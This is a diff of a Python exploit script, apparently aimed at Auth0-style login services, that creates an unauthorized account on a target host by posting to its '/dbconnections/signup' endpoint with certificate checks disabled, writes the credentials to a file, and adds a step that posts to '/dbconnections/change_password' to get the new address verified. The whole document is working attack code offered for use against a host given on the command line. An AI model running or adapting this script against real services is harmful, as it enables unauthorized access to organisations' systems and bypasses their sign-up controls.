@@ -1,16 +1,15 @@
-import subprocess
-import requests
-import sys
 import os
-import urllib3
+import sys
 import time
-from subprocess import run
+
+import requests
+import urllib3
 
 # ANSI color codes for terminal output
-BLUE = "\033[0;34m"
-RED = "\033[91m"
-GREEN = "\033[32m"
-END = "\033[0m"
+BLUE = "\033[0;34m"  # Blue color code
+RED = "\033[91m"    # Red color code
+GREEN = "\033[32m"  # Green color code
+END = "\033[0m"     # Reset color
 
 # Banner
 print(f"""{GREEN}
@@ -21,24 +20,24 @@ print(f"""{GREEN}
  |____/ \__,_|\__,_/_/   \_\___/ \__|_| |_|\___/ 
 {END}                                                                
 """)
-time.sleep(0.2)
+time.sleep(0.2)  # Pause for a brief moment for better UX
 
-# Disable warnings
+# Disable warnings for insecure requests (e.g., self-signed SSL certificates)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Create directory for saving output
+# Function to create a directory for saving output files
 def mk_dir(host):
     try:
         print(f"{GREEN}[+] Creating directory{END}")
-        os.makedirs(host, exist_ok=True)
-        time.sleep(0.2)
-        path = os.path.abspath(host)
+        os.makedirs(host, exist_ok=True)  # Create the directory if it doesn't exist
+        time.sleep(0.2)  # Brief pause for better UX
+        path = os.path.abspath(host)  # Get absolute path of the directory
         print(f"{GREEN}[+] Directory successfully created\nPath: {path} {END}")
     except Exception as e:
         print(f"{RED}Error occurred: {e}{END}")
 
-# Exploit function
-def exploit(host):
+# Function to exploit a vulnerability and create an account
+def exploit(host, mail):
     # Request headers
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
@@ -53,30 +52,34 @@ def exploit(host):
         'Content-Type': 'application/json',
     }
 
+    # Payload for account creation
     payload = {
         'client_id': '',
-        'email': 'hack1@gmail.com',
-        'password': 'rQ8a2;3/c[<J',
+        'email': f'{mail}',
+        'password': 'rQ8a2;3/c[<J',  # Example password
         'connection': 'Username-Password-Authentication',
     }
 
     try:
         print(f"{GREEN}[+] Initializing the exploit...{END}")
+        # Send POST request to create an account
         response = requests.post(
             f'https://{host}/dbconnections/signup',
             headers=headers,
             json=payload,
-            verify=False,
+            verify=False,  # Don't verify SSL certificates
         )
-        time.sleep(0.2)
+        time.sleep(0.2)  # Brief pause for better UX
 
         status_code = response.status_code
+        # Check if account creation was successful
         if status_code in [200, 201]:
             print(f"{GREEN}[+] Account successfully created\n{END}")
-            print(f"{GREEN}[+] Email: hack1@gmail.com\n{END}")
+            print(f"{GREEN}[+] Email: {mail}\n{END}")
             print(f"{GREEN}[+] Pass: rQ8a2;3/c[<J\n{END}")
-            print(f"{GREEN}{response.status_code}{END}")
-            print(f"{GREEN}\n{response.text}{END}")
+            print(f"{GREEN}[+] Status Code: {response.status_code}{END}")
+            print(f"{GREEN}\n[+] Response body content: {response.text}{END}")
+            # Save credentials to a file
             with open(f"{host}/credentials.txt", "w") as file:
                 file.write(f"{payload}")
         elif "connection" in response.json():
@@ -91,15 +94,55 @@ def exploit(host):
     except Exception as e:
         print(f"{RED}Error occurred: {e}{END}")
 
+# Function to verify the email address
+def mail_verify(host, mail):
+    try:
+        # Request headers
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Priority': 'u=0, i',
+            'Content-Type': 'application/json',
+        }
+
+        # Payload for email verification
+        payload = {
+            'email': f'{mail}',
+            'connection': 'Username-Password-Authentication'
+        }
+        # Send POST request for email verification
+        response = requests.post(
+            f'https://{host}/dbconnections/change_password',
+            headers=headers,
+            json=payload,
+            verify=False,
+        )
+        if response.status_code in [200, 201]:
+            print(f"{GREEN}\n[+] Email verification sent to: {mail}{END}")
+        else:
+            print(f"{RED}[-] Unable to verify the mail address{END}")
+    except Exception as e:
+        print(f"{RED}Error occurred: {e}{END}")
+
+# Main function to handle user input and call necessary functions
 def main():
-    if len(sys.argv) != 2:
-        print(f"{RED}[+] Usage: %s <host> {END}" % sys.argv[0])
-        print(f"{RED}[+] Example: %s example.com {END}" % sys.argv[0])
+    if len(sys.argv) != 3:
+        print(f"{RED}[+] Usage: %s <host> <your_mail_address>{END}" % sys.argv[0])
+        print(f"{RED}[+] Example: %s example.com hacker@gmail.com{END}" % sys.argv[0])
         sys.exit(1)
 
     host = sys.argv[1]
-    mk_dir(host)
-    exploit(host)
+    mail = sys.argv[2]
+    mk_dir(host)  # Create directory for output
+    exploit(host, mail)  # Attempt to exploit the vulnerability
+    mail_verify(host, mail)  # Verify the email address
 
+# Entry point of the script
 if __name__ == "__main__":
     main()
